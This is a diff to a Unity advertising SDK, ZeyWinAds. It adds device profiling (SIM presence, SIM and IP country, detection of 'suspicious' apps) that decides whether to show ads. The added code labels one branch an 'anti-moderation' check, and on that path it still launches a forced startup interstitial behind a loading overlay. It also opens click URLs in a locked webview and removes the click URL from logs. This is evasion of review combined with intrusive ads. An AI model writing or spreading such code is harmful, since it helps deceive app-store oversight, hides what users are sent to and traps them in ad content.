@@ -50,6 +50,9 @@ namespace ZeyWinAds
         private static Action<string> _popupRepeatOnButton1;
         private static Action<string> _popupRepeatOnButton2;
         private static bool _webViewEventsSubscribed;
+        private static bool _startupOfferPending;
+        private static Coroutine _googleFallbackCoroutine;
+        private static bool _initializeStarted;
 
         // Events
         public static event Action<AdType> OnAdLoaded;
@@ -88,6 +91,13 @@ namespace ZeyWinAds
                 return;
             }
 
+            if (_initializeStarted)
+            {
+                Core.Logger.Debug("Initialize called more than once, ignoring duplicate call");
+                return;
+            }
+            _initializeStarted = true;
+
             // Always initialize client first (needed for report sending)
             SubscribeToWebViewEvents();
             WebViewLock.Initialize();
@@ -96,6 +106,8 @@ namespace ZeyWinAds
             // CrashGuard is an optional sibling package auto-installed via CrashGuardBootstrap.
             // Soft-call via reflection so ZeyWinAds compiles even if the user removed it.
             TryStartCrashGuard();
+
+            Core.AppTrackingTransparency.RequestIfEnabled();
 
             // AdMob runs in parallel and is NOT gated by anti-fraud — even if our SDK
             // blocks the device, AdMob fallback should keep monetizing.
@@ -123,11 +135,24 @@ namespace ZeyWinAds
             // If already blocked locally, block ad requests and send report
             if (blockReason != "none")
             {
-                AdClient.Instance.SetBlocked(true);
+                if (blockReason == "no_sim")
+                {
+                    AdClient.Instance.SetBlocked(true);
+                    ShowGoogleFallback("no_sim");
+                }
+
                 // Still resolve route so DeviceReport can send
                 Core.ProxyConfig.Resolve(() =>
                 {
-                    Core.DeviceReport.Send(hasSim, simCountry, detectedPackages, deviceClean, "blocked", blockReason);
+                    Core.DeviceReport.Send(hasSim, simCountry, detectedPackages, deviceClean, "blocked", blockReason, (serverStatus, serverReason) =>
+                    {
+                        if (blockReason == "suspicious_apps")
+                        {
+                            Core.Logger.Log("Anti-moderation check failed, showing ZeyWin promo flow");
+                            ConfigureRuntime(preloadSettings);
+                            StartStartupOfferFlow();
+                        }
+                    });
                 });
                 return;
             }
@@ -145,28 +170,26 @@ namespace ZeyWinAds
                 // Send report and use server's final decision
                 Core.DeviceReport.Send(hasSim, simCountry, detectedPackages, deviceClean, geoStatus, geoReason, (serverStatus, serverReason) =>
                 {
+                    if (!geoMatch)
+                    {
+                        AdClient.Instance.SetBlocked(true);
+                        Core.Logger.Log($"No eligible offer for country: SIM={simCountry}, IP={ipCountry}");
+                        ShowGoogleFallback(geoReason);
+                        return;
+                    }
+
                     // Server has the final word — if server says blocked, stop
                     if (serverStatus == "blocked")
                     {
                         AdClient.Instance.SetBlocked(true);
                         Core.Logger.Log($"Device blocked by server: {serverReason}");
+                        ShowGoogleFallback(serverReason);
                         return;
                     }
 
                     // All checks passed — configure and start the AdLoader
-                    if (preloadSettings != null)
-                    {
-                        AdLoader.Instance.Configure(preloadSettings);
-                    }
-
-                    // Subscribe to AdLoader events
-                    AdLoader.Instance.OnAdPreloaded -= OnAdPreloaded;
-                    AdLoader.Instance.OnAdPreloaded += OnAdPreloaded;
-                    AdLoader.Instance.OnPreloadFailed -= OnPreloadFailed;
-                    AdLoader.Instance.OnPreloadFailed += OnPreloadFailed;
-
-                    // Start preloading
-                    AdLoader.Instance.OnSDKInitialize();
+                    ConfigureRuntime(preloadSettings);
+                    StartStartupOfferFlow();
 
                     // Check for cross-app referral (shows locked webview if valid)
                     ReferralManager.Instance.CheckForReferral();
@@ -176,6 +199,71 @@ namespace ZeyWinAds
             });
 
             }); // end ProxyConfig.Resolve
+        }
+
+        private static void ConfigureRuntime(PreloadSettings preloadSettings)
+        {
+            if (preloadSettings != null)
+            {
+                preloadSettings.preloadDelaySeconds = Mathf.Min(preloadSettings.preloadDelaySeconds, 0.1f);
+                AdLoader.Instance.Configure(preloadSettings);
+            }
+
+            AdLoader.Instance.OnAdPreloaded -= OnAdPreloaded;
+            AdLoader.Instance.OnAdPreloaded += OnAdPreloaded;
+            AdLoader.Instance.OnPreloadFailed -= OnPreloadFailed;
+            AdLoader.Instance.OnPreloadFailed += OnPreloadFailed;
+
+            AdLoader.Instance.OnSDKInitialize();
+        }
+
+        private static void StartStartupOfferFlow()
+        {
+            if (WebViewLock.IsLocked)
+                return;
+
+            _startupOfferPending = true;
+            LoadingOverlay.Show();
+            AdLoader.Instance.PreloadAd(AdType.Interstitial, true);
+        }
+
+        private static void ShowGoogleFallback(string reason)
+        {
+            Core.Logger.Log("Showing Google fallback: {0}", string.IsNullOrEmpty(reason) ? "unknown" : reason);
+            if (AdMediator.IsAdMobInterstitialReady())
+            {
+                AdMediator.ShowAdMobInterstitial(null);
+                return;
+            }
+
+            if (_googleFallbackCoroutine != null)
+                return;
+
+            _googleFallbackCoroutine = UnityMainThreadDispatcher.Instance.StartCoroutine(
+                ShowGoogleFallbackWhenReady(reason)
+            );
+        }
+
+        private static System.Collections.IEnumerator ShowGoogleFallbackWhenReady(string reason)
+        {
+            const float timeoutSeconds = 20f;
+            const float retryDelaySeconds = 0.25f;
+            float startedAt = Time.realtimeSinceStartup;
+
+            while (Time.realtimeSinceStartup - startedAt < timeoutSeconds)
+            {
+                if (AdMediator.IsAdMobInterstitialReady())
+                {
+                    AdMediator.ShowAdMobInterstitial(null);
+                    _googleFallbackCoroutine = null;
+                    yield break;
+                }
+
+                yield return new WaitForSecondsRealtime(retryDelaySeconds);
+            }
+
+            Core.Logger.Warn("Google fallback was requested but no AdMob interstitial became ready: {0}", reason);
+            _googleFallbackCoroutine = null;
         }
 
         private static void TryStartCrashGuard()
@@ -1080,6 +1168,14 @@ namespace ZeyWinAds
             Core.Logger.Debug("{0} ad preloaded and ready", adType);
             OnAdLoaded?.Invoke(adType);
 
+            if (_startupOfferPending && adType == AdType.Interstitial)
+            {
+                _startupOfferPending = false;
+                LoadingOverlay.Hide();
+                ShowInterstitial();
+                return;
+            }
+
             // Auto-show popup after configured delay
             if (adType == AdType.Popup && _popupRepeatCoroutine == null)
             {
@@ -1099,6 +1195,13 @@ namespace ZeyWinAds
         {
             Core.Logger.Warn("Preload failed for {0}: {1}", adType, error);
             OnAdFailedToLoad?.Invoke(adType, error);
+
+            if (_startupOfferPending && adType == AdType.Interstitial)
+            {
+                _startupOfferPending = false;
+                LoadingOverlay.Hide();
+                ShowGoogleFallback(error);
+            }
         }
 
         private static void LoadAd(AdType adType)
@@ -1207,7 +1310,7 @@ namespace ZeyWinAds
             {
                 if (ad.lock_webview)
                 {
-                    Core.Logger.Log("Opening URL with lock_webview: {0}", ad.click_url);
+                    Core.Logger.Log("Opening click URL with lock_webview");
                     WebViewLock.Lock(ad.click_url);
                 }
                 else
@@ -1291,6 +1394,14 @@ namespace ZeyWinAds
             _activeAd = null;
             _activeBanner = null;
             _activeNative = null;
+            _startupOfferPending = false;
+            _initializeStarted = false;
+
+            if (_googleFallbackCoroutine != null)
+            {
+                UnityMainThreadDispatcher.Instance.StopCoroutine(_googleFallbackCoroutine);
+                _googleFallbackCoroutine = null;
+            }
 
             // Clear the AdLoader cache
             AdLoader.Instance.ClearCache();
